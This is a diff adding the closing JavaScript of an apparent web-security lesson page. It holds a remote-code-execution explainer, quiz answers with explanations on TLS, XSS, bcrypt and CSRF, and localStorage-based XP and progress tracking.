+  rce:{name:'Remote Code Execution (RCE)',desc:'<strong>What:</strong> Attacker can execute arbitrary code on the server — the most severe class of vulnerability.<br><br><strong>Example:</strong> An image upload endpoint that doesn\'t validate file type allows uploading a .php file, which the server then executes.<br><br><strong>Fix:</strong> Validate and sanitise all uploads. Run services with minimal OS permissions. Keep dependencies patched.'}
+};
+
+function showAttack(key){
+  document.querySelectorAll('.attack-btn').forEach(b=>b.classList.remove('active'));
+  document.getElementById('ab-'+key).classList.add('active');
+  document.getElementById('attackDetail').innerHTML=ATTACKS[key].desc;
+}
+
+function loadProgress(){
+  const s=JSON.parse(localStorage.getItem('helix_session')||'null');
+  if(!s){window.location.href='login.html';return;}
+  const p=JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}');
+  xp=p.xp||0;
+  document.getElementById('navXp').textContent=xp+' XP';
+  showAttack('sqli');
+  updateModuleProgress();
+}
+
+function saveXP(amt){
+  const p=JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}');
+  p.xp=(p.xp||0)+amt;xp=p.xp;
+  p.lastActivity=new Date().toISOString();
+  localStorage.setItem(STORAGE_KEY,JSON.stringify(p));
+  document.getElementById('navXp').textContent=xp+' XP';
+  showToast(amt);
+}
+
+function showToast(amt){
+  const t=document.getElementById('xpToast');
+  document.getElementById('toastAmt').textContent=amt;
+  t.classList.add('show');setTimeout(()=>t.classList.remove('show'),2200);
+}
+
+function checkChallenge(n,correct){
+  const inp=document.getElementById('c'+n+'-inp').value.trim().toLowerCase();
+  const fb=document.getElementById('c'+n+'-fb');
+  if(inp===correct.toLowerCase()){
+    if(!challenges[n]){challenges[n]=true;saveXP(15);updateModuleProgress();}
+    fb.textContent='✓ Correct!';fb.className='challenge-feedback correct';
+  } else {
+    fb.textContent='✗ Not quite — re-read the lesson and try again.';fb.className='challenge-feedback wrong';
+  }
+}
+
+function toggleHint(n){
+  const h=document.getElementById('hint-'+n);
+  h.style.display=h.style.display==='block'?'none':'block';
+}
+
+const QUIZ_CORRECT={1:'c',2:'b',3:'d',4:'b'};
+const QUIZ_EXPLAIN={
+  1:'TLS provides encryption (confidentiality), message authentication codes (integrity), and certificate-based server authentication. HTTP has none of these.',
+  2:'Injecting JavaScript into pages that execute in other users\' browsers is Cross-Site Scripting (XSS). The script steals the cookie by redirecting to the attacker\'s server.',
+  3:'bcrypt with a unique salt per user is the gold standard for password hashing. MD5 is broken, AES is reversible (not a hash), and plaintext is never acceptable.',
+  4:'CSRF tokens are secret, per-session values included in forms. Since an attacker\'s malicious page can\'t read them (same-origin policy), it can\'t forge valid requests.'
+};
+
+function answerQuiz(n,choice){
+  if(quizAnswers[n])return;
+  quizAnswers[n]=choice;
+  const card=document.getElementById('q'+n);
+  const opts=card.querySelectorAll('.quiz-opt');
+  const correct=QUIZ_CORRECT[n];
+  opts.forEach(btn=>{
+    btn.disabled=true;
+    if(btn.textContent.startsWith(correct+')')){btn.classList.add('correct');}
+    else if(btn.textContent.startsWith(choice+')')){btn.classList.add('wrong');}
+  });
+  const fb=document.getElementById('qf'+n);
+  if(choice===correct){fb.textContent='✓ '+QUIZ_EXPLAIN[n];fb.className='quiz-feedback correct';saveXP(20);}
+  else{fb.textContent='✗ '+QUIZ_EXPLAIN[n];fb.className='quiz-feedback wrong';}
+  updateModuleProgress();
+}
+
+function updateModuleProgress(){
+  const chalDone=Object.keys(challenges).length;
+  const quizDone=Object.keys(quizAnswers).length;
+  const pct=Math.round(((chalDone+quizDone)/8)*100);
+  document.getElementById('prog-fill').style.width=pct+'%';
+  document.getElementById('prog-label').textContent=pct+'%';
+  const allDone=chalDone>=4&&quizDone>=4;
+  document.getElementById('completeBtn').disabled=!allDone;
+  if(allDone)document.getElementById('completeNote').textContent='All done — mark this module complete!';
+}
+
+function completeModule(){
+  const p=JSON.parse(localStorage.getItem(STORAGE_KEY)||'{}');
+  if(!p.modules)p.modules={};
+  if(!p.modules[MODULE_KEY]){
+    p.modules[MODULE_KEY]={completed:true,completedAt:new Date().toISOString()};
+    p.xp=(p.xp||0)+120;p.completedLessons=(p.completedLessons||0)+1;
+    p.lastActivity=new Date().toISOString();
+    localStorage.setItem(STORAGE_KEY,JSON.stringify(p));
+    xp=p.xp;document.getElementById('navXp').textContent=xp+' XP';
+    showToast(120);
+  }
+  setTimeout(()=>{window.location.href='web-internet.html';},1200);
+}
+
+function scrollToLesson(id){
+  document.getElementById(id)?.scrollIntoView({behavior:'smooth',block:'start'});
+  document.querySelectorAll('.lesson-item').forEach(li=>li.classList.remove('active'));
+  const map={l1:0,l2:1,l3:2,l4:3,quiz:5};
+  const items=document.querySelectorAll('.lesson-item');
+  if(map[id]!==undefined)items[map[id]].classList.add('active');
+}
+
+loadProgress();
+</script>
+</body>
+</html>
